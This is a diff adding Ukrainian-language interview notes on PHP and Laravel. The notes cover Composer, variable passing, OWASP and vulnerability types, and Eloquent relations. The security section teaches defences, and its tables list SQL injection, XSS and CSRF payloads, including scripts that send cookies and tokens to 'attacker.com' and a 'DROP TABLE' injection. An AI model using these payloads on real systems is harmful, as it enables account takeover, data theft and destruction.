@@ -1,4 +1,559 @@
-# 1. Як під капотом реалізовується сервіс контейнер
+## PHP Junior
+
+https://gist.github.com/GubaEvgeniy/988f9b7910c87250fa05c1bdb02754f6 (1-37 answers)
+
+### 1. Що таке Composer?
+
+<details>
+<summary>Розкрити:</summary>
+
+**Composer** — це менеджер залежностей для PHP (як `npm` для JavaScript).
+
+Простими словами:
+- ти пишеш, які бібліотеки потрібні проєкту;
+- Composer їх завантажує;
+- фіксує точні версії;
+- підключає автозавантаження класів.
+
+Що він дає на практиці:
+- встановлення пакетів з [Packagist](https://packagist.org/);
+- керування версіями (`^`, `~`, конкретні версії);
+- однакове оточення для всієї команди через `composer.lock`;
+- autoload через PSR-4 (`vendor/autoload.php`);
+- скрипти (`post-install-cmd`, `test` тощо).
+
+Основні файли:
+- `composer.json` — декларація залежностей і налаштувань проєкту;
+- `composer.lock` — зафіксовані конкретні версії (щоб у всіх ставилось однаково);
+- `vendor/` — встановлені пакети + autoload.
+
+Базові команди:
+- `composer init` — створити `composer.json`;
+- `composer require monolog/monolog` — додати пакет;
+- `composer install` — встановити з `lock`;
+- `composer update` — оновити залежності;
+- `composer remove vendor/package` — прибрати пакет;
+- `composer dump-autoload` — перебудувати автозавантаження.
+
+Дуже короткий приклад:
+
+```json
+{
+  "require": {
+    "monolog/monolog": "^3.0"
+  }
+}
+```
+
+```php
+require __DIR__ . '/vendor/autoload.php';
+```
+
+І можна використовувати класи пакета без ручних `require` кожного файлу.
+
+</details>
+
+## PHP Middle
+
+### 1. Як передаються змінні (за значенням або за посиланням)?
+
+<details>
+<summary>Розкрити:</summary>
+
+Коротко:
+- Скалярні та масиви — логічно "за значенням", але під капотом через copy-on-write (реальна копія робиться тільки при зміні).
+- Об'єкти — у змінній зберігається ідентифікатор/handle на об'єкт; при присвоєнні копіюється handle, тому обидві змінні дивляться на той самий об'єкт.
+- Явне посилання робиться через `&` (і для параметрів, і для присвоєння).
+
+1) Скаляр/масив: copy-on-write
+
+```php
+$a = [1, 2, 3];
+$b = $a;      // поки що без фізичної копії
+$b[] = 4;     // тут відбудеться відокремлення (копія для $b)
+var_dump($a); // [1,2,3]
+var_dump($b); // [1,2,3,4]
+```
+
+Тобто поводиться як "за значенням", але оптимізовано.
+
+2) Об'єкти: shared handle
+
+```php
+$o1 = new stdClass();
+$o1->x = 10;
+$o2 = $o1;     // копія handle, не новий об'єкт
+$o2->x = 99;
+echo $o1->x;   // 99
+```
+
+Це не "посилання &", але ефект схожий: зміни видно через обидві змінні, бо об'єкт один.
+
+Якщо потрібна окрема копія об'єкта:
+
+```php
+$o3 = clone $o1;
+```
+
+3) Явна передача за посиланням (`&`)
+
+Параметр функції:
+
+```php
+function inc(&$n) {
+    $n++;
+}
+
+$x = 5;
+inc($x);
+echo $x; // 6
+```
+
+Посилальне присвоєння:
+
+```php
+$a = 10;
+$b =& $a;
+$b = 20;
+echo $a; // 20
+```
+
+4) У функціях без `&`
+
+```php
+function change($arr) {
+    $arr[] = 100;
+}
+
+$x = [1,2];
+change($x);
+var_dump($x); // [1,2]
+```
+
+Без `&` зовнішня змінна не зміниться (для масиву/скаляра).
+
+Для об'єкта навіть без `&` можна змінити його стан:
+
+```php
+function touchObj($obj) {
+    $obj->flag = true;
+}
+
+$o = new stdClass();
+touchObj($o);
+var_dump($o->flag); // true
+```
+
+Нюанс: `=` для об'єктів копіює handle (посилання на той самий об'єкт), а не створює новий об'єкт.
+
+`clone` створює новий об'єкт (новий handle), а не копіює посилання.
+
+```php
+$o1 = new stdClass();
+$o1->x = 10;
+
+$o2 = clone $o1; // новий об'єкт
+$o2->x = 99;
+
+echo $o1->x; // 10
+echo $o2->x; // 99
+```
+
+Тут посилання з'являється явно через `&`: `$b =& $a` робить `$b` і `$a` двома іменами одного значення.
+Без `&` для скалярів було б копіювання за значенням.
+
+</details>
+
+### 2. Які процеси відбуваються, коли користувач вводить у браузері URL?
+
+<details>
+<summary>Розкрити:</summary>
+
+Коротка відповідь:
+1. Браузер розбирає URL (протокол, домен, шлях).
+2. Через DNS знаходить IP сайту.
+3. Встановлює з'єднання із сервером (TCP, для HTTPS ще TLS).
+4. Надсилає HTTP-запит.
+5. Сервер повертає відповідь.
+6. Браузер рендерить сторінку і підвантажує ресурси.
+
+Формула:
+`URL -> DNS -> з'єднання -> HTTP-запит -> відповідь -> рендер`.
+
+1) Парсинг URL у браузері:
+- протокол (`https`)
+- хост (`example.com`)
+- порт (443 за замовчуванням для HTTPS)
+- шлях (`/products`), query, fragment.
+
+2) Перевірка локальних кешів:
+- DNS cache
+- HTTP cache
+- Service Worker (якщо є)
+- інколи HSTS політику (чи треба примусово HTTPS).
+
+3) DNS-резолв (домен -> IP):
+- браузер питає OS resolver
+- далі DNS-сервер
+- отримує IP (A/AAAA запис).
+
+4) Встановлення з'єднання:
+- TCP handshake (3-way)
+- для HTTPS: TLS handshake (сертифікат, шифрування, узгодження ключів)
+- перевірка сертифіката (CA, домен, строк дії).
+
+5) Надсилання HTTP-запиту:
+- метод `GET`
+- шлях `/products`
+- заголовки (`Host`, `User-Agent`, `Accept`, `Cookie` тощо).
+
+6) Обробка на сервері:
+- веб-сервер (Nginx/Apache) приймає запит
+- передає у застосунок (PHP-FPM/Laravel)
+- роутинг -> middleware -> controller -> бізнес-логіка
+- за потреби звернення до БД/кешу/інших сервісів.
+
+7) Відповідь сервера:
+- статус (`200`, `301`, `404`, ...)
+- заголовки (`Content-Type`, `Cache-Control`, `Set-Cookie`, ...)
+- тіло (HTML/JSON/файл).
+
+8) Браузер обробляє відповідь:
+- якщо редірект (`301/302/307`) — робить новий запит на `Location`
+- якщо HTML — парсить DOM
+- завантажує підресурси (CSS/JS/зображення/шрифти) окремими запитами
+- виконує JS, будує render tree, layout, paint, compositing.
+
+9) Відображення сторінки + подальші запити:
+- XHR/fetch до API
+- lazy-load ресурсів
+- WebSocket/SSE тощо.
+
+Коротка формула:
+`URL -> DNS -> TCP/TLS -> HTTP request -> backend -> HTTP response -> parse/render -> assets/API`.
+
+</details>
+
+### 3. Що таке варіативна функція або splat-оператор?
+
+<details>
+<summary>Розкрити:</summary>
+
+Коротко:
+
+Варіативна функція — це функція, яка може приймати довільну кількість аргументів.
+У PHP це робиться через splat-оператор `...`.
+
+1) Прийом багатьох аргументів у функції:
+
+```php
+function sum(int ...$numbers): int
+{
+    return array_sum($numbers);
+}
+
+echo sum(1, 2, 3);       // 6
+echo sum(10, 20, 30, 5); // 65
+```
+
+`...$numbers` збирає всі передані аргументи в масив `$numbers`.
+
+2) "Розпакування" масиву в аргументи:
+
+```php
+function greet(string $name, int $age): void
+{
+    echo "$name, $age";
+}
+
+$data = ['Yurii', 25];
+greet(...$data); // те саме, що greet('Yurii', 25)
+```
+
+Тут `...$data` робить навпаки: розкладає масив на окремі аргументи.
+
+3) У методах і конструкторах — так само:
+
+```php
+class Logger
+{
+    public function log(string ...$messages): void
+    {
+        foreach ($messages as $m) {
+            echo $m . PHP_EOL;
+        }
+    }
+}
+```
+
+Різниця в один рядок:
+- `function f(...$args)` — збір багатьох аргументів;
+- `f(...$array)` — розпакування масиву в аргументи.
+
+</details>
+
+### 4. Що таке OWASP?
+
+<details>
+<summary>Розкрити:</summary>
+
+OWASP — спільнота, яка написала best practices, щоб уникнули уразливостей для сайтів.
+
+Для чого він:
+- дає зрозумілий список найчастіших вразливостей;
+- показує, як їх перевіряти і як виправляти;
+- дає стандарти безпеки, щоб команда говорила "однією мовою".
+
+OWASP checklist для PHP/Laravel (практичний мінімум):
+
+1) SQL Injection
+- тільки prepared statements / ORM;
+- ніколи не збирати SQL конкатенацією з user input.
+
+2) XSS
+- екранування виводу (`{{ }}` у Blade за замовчуванням);
+- не вставляти сирий HTML без суворої санітизації;
+- додати CSP.
+
+3) CSRF
+- для state-changing запитів використовувати CSRF token;
+- не вимикати CSRF middleware без реальної причини.
+
+4) Authentication
+- сильні хеші паролів (`password_hash`, у Laravel вже є `bcrypt/argon2`);
+- MFA для адмінів;
+- ліміт спроб логіну (rate limit).
+
+5) Authorization (Broken Access Control)
+- перевіряти доступ на сервері для кожної дії;
+- використовувати Policies/Gates;
+- не довіряти ID з фронта без перевірки власника/ролі.
+
+6) Session & Cookies
+- `Secure`, `HttpOnly`, `SameSite`;
+- тільки HTTPS;
+- регенерація `session_id` після логіну.
+
+7) Secrets & Config
+- ніяких секретів у git;
+- `.env` тільки на сервері;
+- ротація ключів/токенів при витоку.
+
+8) File Upload
+- whitelist MIME/розширень;
+- перейменування файлів, зберігання поза `public` (або через контрольований доступ);
+- перевірка розміру, сканування за потреби.
+
+9) Dependency Security
+- оновлювати залежності;
+- регулярно запускати `composer audit`;
+- слідкувати за CVE у пакетах.
+
+10) Logging & Monitoring
+- логувати security-події (логін, невдалі спроби, 403, зміни ролей);
+- не логувати паролі/токени/персональні дані у відкритому вигляді;
+- алерти на аномалії.
+
+</details>
+
+### 5. Які типи вразливостей знаєте? Як від них захищатися?
+
+<details>
+<summary>Розкрити:</summary>
+
+**1. SQL Injection**  
+Суть: user input потрапляє в SQL як частина запиту.
+Приклад: логін шукає користувача через конкатенацію рядка SQL.  
+Чому небезпечно: можна обійти авторизацію, витягнути/змінити дані в БД.  
+Захист: тільки prepared statements / ORM, валідація вводу, мінімальні права користувача БД.
+
+**Prepared statements** — це коли SQL-запит готується окремо від даних (PDO extension).  
+Тобто структура SQL фіксована, а значення підставляються як параметри.
+
+Навіть якщо хакер вводить:
+
+    ' OR 1=1 --
+
+PDO передає це як **значення**, а не SQL-код:
+
+``` sql
+email = "' OR 1=1 --"
+```
+
+✔ структура запиту незмінна\
+✔ SQL не ламається\
+✔ інʼєкція неможлива
+
+
+```php
+// vulnerable
+$email = $_POST['email'] ?? '';
+$sql = "SELECT * FROM users WHERE email = '$email'";
+$user = $pdo->query($sql)->fetch();
+
+// safe
+$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
+$stmt->execute(['email' => $email]);
+$user = $stmt->fetch();
+```
+
+---
+
+| Case | Payload | Що стане SQL | Що відбувається | Результат |
+|------|--------|--------------|-----------------|-----------|
+| Login Bypass | `' OR 1=1 --` | `SELECT * FROM users WHERE email = '' OR 1=1 --'` | `1=1` завжди TRUE, `--` коментує решту |  Login без пароля |
+| Login як admin | `' OR email='admin@gmail.com' --` | `SELECT * FROM users WHERE email = '' OR email='admin@gmail.com' --'` | Запит шукає admin |  Авторизація як admin |
+| Всі записи | `' OR 'a'='a` | `SELECT * FROM users WHERE email = '' OR 'a'='a'` | TRUE умова |  Повертаються всі користувачі |
+| UNION Injection | `' UNION SELECT id, password FROM users --` | `SELECT * FROM users WHERE email = '' UNION SELECT id, password FROM users --` | Об’єднання результатів |  Витік даних |
+| Виконання SQL | `'; DROP TABLE users; --` | `SELECT * FROM users WHERE email = ''; DROP TABLE users; --'` | Виконується додатковий SQL | 💀 Видалення таблиці |
+
+---
+
+**2. XSS (Cross-Site Scripting)**  
+Суть: на сторінці виконується шкідливий JS.  
+Приклад: коментар вивели без екранування HTML.  
+Чому небезпечно: крадіжка токенів/даних, підміна UI, дії від імені користувача.  
+Захист: екранування виводу, CSP, санітизація HTML, `HttpOnly` для cookies.
+
+Екранування — це коли небезпечні HTML-символи перетворюються в безпечний текст.  
+Наприклад, `<` стає `&lt;`, `>` стає `&gt;`, `"` стає `&quot;`, `'` стає `&#039;`.
+
+Як це працює:
+- користувач вводить: `<script>alert('XSS')</script>`
+- виконуємо екранування через `htmlspecialchars(...)`
+- браузер бачить: `&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;`
+- у результаті це відображається як текст, а не виконується як HTML / JS
+
+Тобто екранування не "видаляє" символи, а робить так, щоб браузер не сприймав їх як код.
+
+```php
+// vulnerable
+echo "<div>" . $_POST['comment'] . "</div>";
+
+// safe
+$comment = $_POST['comment'] ?? '';
+echo "<div>" . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') . "</div>";
+```
+
+| № | Тип атаки | Приклад | Результат |
+|---|-----------|---------|-----------|
+| 1 | Basic XSS | `<script>alert('XSS')</script>` | Виконується JS у браузері користувача |
+| 2 | Крадіжка cookies | `<script>fetch('https://attacker.com?c=' + document.cookie)</script>` | Відправка cookies атакуючому (якщо cookie НЕ HttpOnly) |
+| 3 | Image XSS | `<img src=x onerror="alert('XSS')">` | JS запускається через HTML attribute |
+| 4 | Крадіжка JWT / LocalStorage | `<script>fetch('https://attacker.com?token=' + localStorage.token)</script>` | Викрадення access token |
+| 5 | Fake Login Form | `<script>document.body.innerHTML = '<form action="https://attacker.com"><input name="password"></form>';</script>` | Користувач вводить пароль у фейкову форму |
+| 6 | Stored XSS | `<script>alert('stored')</script>` | Виконується у ВСІХ користувачів, зберігається в БД |
+
+**3. CSRF**  
+Сценарій атаки (як це працює):
+
+1. Користувач логіниться на `bank.com`, сервер (bank.com) створює сесію, відправляє користувачу, браузер зберігає у cookie:
+   `SESSION_ID=123`.
+2. Потім користувач відкриває сторонній сайт (реклама, посилання, вкладка).
+3. На цій сторінці є прихована форма або скрипт, що відправляє запит на `bank.com/transfer`.
+4. Браузер **автоматично додає cookies** (так працює браузер) до запитів на `bank.com`, тому разом із запитом піде `SESSION_ID=123`.
+5. Сервер бачить валідну сесію і вважає, що дію виконав сам користувач.
+
+Результат: може виконатись небезпечна дія (наприклад, переказ коштів).
+
+### ✅ Як захищає CSRF token
+
+Сервер:
+1. Генерує CSRF token і зберігає його у session.
+2. Вставляє token у форму:
+   `<input type="hidden" name="csrf" value="ABC123">`
+3. На `POST`-запиті перевіряє token.
+
+Хакерський сайт не може прочитати цей token, тому підроблений запит відхиляється.
+
+Laravel:
+- middleware: `VerifyCsrfToken`
+- у Blade-формах: `@csrf`
+
+### 🧨 Основні сценарії атак
+
+| Case | Тип атаки | Payload | Що відбувається | Результат |
+|------|-----------|---------|-----------------|-----------|
+| 1 | Fake Form | `<form action="https://bank.com/transfer" method="POST">` | Форма відправляється від імені user | ✅ Переказ грошей |
+| 2 | Auto Submit | `<script>document.forms[0].submit()</script>` | JS автоматично сабмітить форму | ✅ Дія без кліку |
+| 3 | Image GET | `<img src="https://site.com/delete?id=5">` | Браузер робить GET автоматично | 💀 Видалення ресурсу |
+| 4 | Change Password | POST на `/change-password` | Cookie додається автоматично | ✅ Зміна пароля |
+| 5 | Email Change | POST на `/change-email` | Сервер думає що це user | 💀 Захоплення акаунта |
+
+---
+
+**4. Broken Access Control (IDOR)**  
+Суть: користувач отримує доступ до чужих ресурсів через підміну ID.  
+Приклад: `/orders/123` відкриває чуже замовлення без перевірки власника.  
+Чому небезпечно: витік і модифікація чужих даних.  
+Захист: перевірка авторизації на сервері для кожного ресурсу, policies/gates, не довіряти ID з фронта.
+
+```php
+// vulnerable
+$order = Order::find($_GET['id']);
+
+// safe
+$order = Order::where('id', $_GET['id'])
+    ->where('user_id', $authUser->id)
+    ->firstOrFail();
+```
+
+**5. Неправильна аутентифікація/сесії**  
+Суть: слабкі паролі, відсутній rate-limit, небезпечні cookies.  
+Приклад: без ліміту спроб можна брутфорсити акаунт.  
+Чому небезпечно: захоплення акаунтів.  
+Захист: `bcrypt/argon2`, MFA, rate-limit, `Secure + HttpOnly + SameSite`, регенерація `session_id` після логіну.
+
+```php
+// safe password + session
+$hash = password_hash($_POST['password'], PASSWORD_ARGON2ID);
+if (password_verify($_POST['password'], $hash)) {
+    session_regenerate_id(true);
+}
+```
+
+**6. Небезпечне завантаження файлів** 
+Суть: приймаються файли без перевірок.  
+Приклад: завантажили шкідливий скрипт під виглядом зображення.  
+Чому небезпечно: виконання коду або зараження контенту.  
+Захист: whitelist MIME/розширень, перевірка розміру, зберігання поза `public`, рандомні імена, сканування.
+
+```php
+$f = $_FILES['file'];
+$allowed = ['image/jpeg' => 'jpg', 'image/png' => 'png'];
+$mime = mime_content_type($f['tmp_name']);
+if (!isset($allowed[$mime])) { exit('Invalid file type'); }
+$name = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
+move_uploaded_file($f['tmp_name'], __DIR__ . '/storage/uploads/' . $name);
+```
+
+**7. Витік секретів / Security Misconfiguration**  
+Суть: неправильні налаштування або секрети в репозиторії.  
+Приклад: `.env` у git, debug mode на проді.  
+Чому небезпечно: доступ до БД, API, внутрішніх даних.  
+Захист: секрети тільки в env/secret manager, вимкнений debug, регулярний аудит конфігів.
+
+```env
+APP_DEBUG=false
+# secrets only in environment / secret manager, not in git
+```
+
+**8. Вразливі залежності**  
+Суть: використання пакетів з відомими CVE.  
+Приклад: стара бібліотека з критичною дірою.  
+Чому небезпечно: атака через сторонній код.  
+Захист: регулярні оновлення, `composer audit`, моніторинг CVE.
+
+```bash
+composer audit
+composer update
+```
+
+</details>
+
+## Laravel
+
+### 1. Як під капотом реалізовується Service Container
 
 <details>
 <summary>Розкрити:</summary>
@@ -116,6 +671,198 @@ var_dump($b1 instanceof BindInterface); // true
 ```
 
 - **Важливо**: це не GoF Singleton у класі, а container-level `shared singleton` (in-memory cache в RAM на час життя контейнера).
+
+</details>
+
+### 2. Які є зв’язки і як вони реалізуються в Laravel?
+
+<details>
+<summary>Розкрити:</summary>
+
+Основні зв’язки Eloquent:
+- `hasOne` / `belongsTo` (One To One)
+- `hasMany` / `belongsTo` (One To Many)
+- `belongsToMany` (Many To Many)
+- `hasOneThrough`, `hasManyThrough`
+- поліморфні: `morphOne`, `morphMany`, `morphTo`, `morphToMany`, `morphedByMany`
+
+Приклад найуживаніших:
+
+```php
+// One To Many: Post -> Comments
+class Post extends Model
+{
+    public function comments()
+    {
+        return $this->hasMany(Comment::class);
+    }
+}
+
+class Comment extends Model
+{
+    public function post()
+    {
+        return $this->belongsTo(Post::class);
+    }
+}
+
+// Many To Many: User <-> Role
+class User extends Model
+{
+    public function roles()
+    {
+        return $this->belongsToMany(Role::class); // pivot: role_user
+    }
+}
+
+class Role extends Model
+{
+    public function users()
+    {
+        return $this->belongsToMany(User::class);
+    }
+}
+```
+
+Як використовуються:
+
+```php
+Post::with('comments')->get();         // eager loading
+$post->comments;                       // доступ до зв'язку
+$post->comments()->create([...]);      // створення через relation
+User::whereHas('roles')->get();        // фільтр по зв'язку
+```
+
+Детальніше про `hasOneThrough` і `hasManyThrough`:
+
+### `hasOneThrough` (один через проміжну модель)
+Використовується, коли хочемо отримати **одну кінцеву модель** через **одну проміжну**.
+
+Приклад: `Mechanic -> Car -> Owner`  
+Механік пов'язаний з авто, авто пов'язане з власником, а нам треба одразу власника механіка.
+
+```php
+class Mechanic extends Model
+{
+    public function owner()
+    {
+        return $this->hasOneThrough(Owner::class, Car::class);
+    }
+}
+
+class Car extends Model
+{
+    public function mechanic()
+    {
+        return $this->belongsTo(Mechanic::class);
+    }
+
+    public function owner()
+    {
+        return $this->belongsTo(Owner::class);
+    }
+}
+```
+
+Використання:
+
+```php
+$owner = Mechanic::find(1)->owner;
+```
+
+### `hasManyThrough` (багато через проміжну модель)
+Використовується, коли хочемо отримати **багато кінцевих моделей** через **одну проміжну**.
+
+Приклад: `Country -> User -> Post`  
+Країна має багато користувачів, користувачі мають багато постів, треба одразу всі пости країни.
+
+```php
+class Country extends Model
+{
+    public function posts()
+    {
+        return $this->hasManyThrough(Post::class, User::class);
+    }
+}
+
+class User extends Model
+{
+    public function country()
+    {
+        return $this->belongsTo(Country::class);
+    }
+
+    public function posts()
+    {
+        return $this->hasMany(Post::class);
+    }
+}
+```
+
+Використання:
+
+```php
+$posts = Country::find(1)->posts;
+```
+
+Коротко:
+- `hasOneThrough` = одна модель через проміжну.
+- `hasManyThrough` = колекція моделей через проміжну.
+- Обидва зв'язки зменшують ручні `join` і роблять код читабельнішим.
+
+</details>
+
+### 3. Що таке поліморфні зв’язки, як вони працюють?
+
+<details>
+<summary>Розкрити:</summary>
+
+Поліморфний зв’язок = одна модель може належати різним типам моделей.
+
+Приклад: одна таблиця `images` для аватарки `User` і прев’ю `Post`.
+
+У таблиці `images`:
+- `imageable_id`
+- `imageable_type`
+
+Тобто один запис `Image` може посилатись або на `User`, або на `Post`.
+
+```php
+class User extends Model
+{
+    public function image()
+    {
+        return $this->morphOne(Image::class, 'imageable');
+    }
+}
+
+class Post extends Model
+{
+    public function image()
+    {
+        return $this->morphOne(Image::class, 'imageable');
+    }
+}
+
+class Image extends Model
+{
+    public function imageable()
+    {
+        return $this->morphTo();
+    }
+}
+```
+
+Використання:
+
+```php
+$userImage = User::find(1)->image;   // одна Image для User
+$postImage = Post::find(10)->image;  // одна Image для Post
+
+$owner = Image::find(5)->imageable;  // поверне або User, або Post
+```
+
+Це прибирає дублювання таблиць (`user_images`, `post_images`) і дає одну універсальну модель.
 
 </details>
 
